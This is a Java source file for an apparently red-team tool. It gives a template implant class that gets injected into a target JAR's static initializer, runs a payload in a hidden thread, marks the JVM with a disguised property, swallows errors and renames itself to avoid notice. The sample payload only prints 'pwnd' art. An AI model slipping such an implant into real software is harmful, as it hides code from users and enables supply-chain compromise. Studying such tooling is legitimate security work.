package io.github.w1th4d.jarplant.implants;

/**
 * Template class for the ClassInjector.
 * <p>Feel free to copy this into a new custom implant class and modify it. Normally in Java, this would be an abstract
 * super class for you to extend in your own class. This common design practice will be avoided here because it would
 * complicate the injection process. Having everything in one big class requires only one class file to be injected into
 * the target JAR, thus making the implant a bit less obvious and more simple. The downside is that the code for
 * implants may be a bit more involved to maintain - a small price to pay for a more stealthy and robust implant.</p>
 * <p>Also feel free to add any static field beginning with <i>CONF_*</i> to add your own config properties for the
 * implant. These will be picked up by the injector and hardcoded into the class file's const pool.</p>
 * <p>If you don't want to bother with creating new files and stuff, then you may also just add your code to this
 * template class, recompile the project and use it with the ClassInjector.</p>
 * <p>Also note that this class will be renamed to something else during the injection process in order to masquerade
 * it slightly.</p>
 */
public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
    /**
     * JVM system property to create and use as a "marker" to determine if an implant has been detonated in this JVM.
     * <p>This property name could be anything that does not already naturally exist in the JVM. Just make it blend in.</p>
     * <p>The default value is <i>"java.class.init"</i>.</p>
     */
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";

    /**
     * Controls whether the payload thread will block the JVM from fully exiting until the payload is done.
     * <p>When set to <code>true</code>>, a separate "lookout thread" will be used to interrupt the payload thread when
     * it seems like the app is finished executing. <b>Make sure your payload properly handles thread interruption when
     * performing long-running or blocking operations.</b> Failing to do so may cause the JVM to not exit properly when
     * the target app is done.</p>
     * <p>Default value is <code>false</code>.</p>
     */
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;

    /**
     * Optional delay (in milliseconds) before the implant payload will detonate.
     * <p>This can be used in combination with <code>CONF_BLOCK_JVM_SHUTDOWN</code> in order to only run the payload
     * when the app is a long-running one (like a service). Just set it to <code>0</code> in order to run the payload
     * as soon as possible.</p>
     * <p>The default value is <code>0</code>.</p>
     */
    static volatile int CONF_DELAY_MS = 0;

    /**
     * The entry point in this implant class.
     * <p>The <code>ClassInjector</code> will copy this method to the target and modify the target's class initializer
     * function to invoke this method.</p>
     * <p>You probably don't want to modify this method.</p>
     */
    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                // Run the payload in a separate thread:
                ClassImplant implant = new ClassImplant();
                Thread payloadThread = new Thread(implant);
                payloadThread.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                payloadThread.setUncaughtExceptionHandler(implant);
                payloadThread.start();

                if (CONF_BLOCK_JVM_SHUTDOWN) {
                    // Run a lookout thread that waits for all other (non-daemon) threads in the JVM to finish:
                    Thread lookoutThread = new Thread(() -> waitForOtherThreads(payloadThread));
                    lookoutThread.setUncaughtExceptionHandler(implant);
                    lookoutThread.start();
                }
            }
        }
    }

    /**
     * Entry point for the payload thread.
     */
    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }

        if (!Thread.currentThread().isInterrupted()) {
            payload();
        }
    }

    /**
     * Wait for all non-daemon thread on this JVM to finish, then interrupt the payload thread.
     * <p>This enables the payload to shut down gracefully.</p>
     *
     * @param payloadThread reference to the payload thread
     */
    private static void waitForOtherThreads(Thread payloadThread) {
        while (!Thread.interrupted()) {
            // Inspect threads currently running in this JVM:
            boolean foundAnyOtherThreadAlive = false;
            for (Thread thread : Thread.getAllStackTraces().keySet()) {
                if (thread.equals(payloadThread)) {
                    continue;
                }
                if (thread.equals(Thread.currentThread())) {
                    continue;
                }
                if (thread.isDaemon()) {
                    continue;
                }
                if (thread.getName().equals("DestroyJavaVM") || thread.getStackTrace().length == 0) {
                    /*
                     * When the main thread is finished, a special thread "DestroyJavaVM" may pop up.
                     * This is and indicator that the main thread is done, but that does not mean all (legit) threads
                     * are done yet. Ignore this thread and continue the search.
                     */
                    continue;
                }
                if (thread.isAlive()) {
                    foundAnyOtherThreadAlive = true;
                    break;
                }
            }

            if (!foundAnyOtherThreadAlive) {
                payloadThread.interrupt();
                break;
            }

            // Wait for a while and check again...
            try {
                //noinspection BusyWait because we can't put latches and stuff in all arbitrary threads we're waiting for.
                Thread.sleep(500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }

    /**
     * Handler for any uncaught exceptions.
     * <p>This stops the JVM from spewing errors to stderr when something goes wrong in the thread.</p>
     *
     * @param thread    the thread that had an exception
     * @param throwable the uncaught exception
     */
    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    /**
     * This is the actual payload.
     * <p>This is the place to put your own payload code.</p>
     * <p>Feel free to rename this method. Remember that method names will show up in the compiled class file.</p>
     */
    private void payload() {
        System.out.println("  /\\/\\/\\");
        System.out.println("  | \\/ |");
        System.out.println("  \\__\\_/");
        System.out.println("    ||");
        System.out.println("  \\ || /");
        System.out.println(" __\\||/__");
        System.out.println(" \\ pwnd /");
        System.out.println("  \\____/");
    }
}
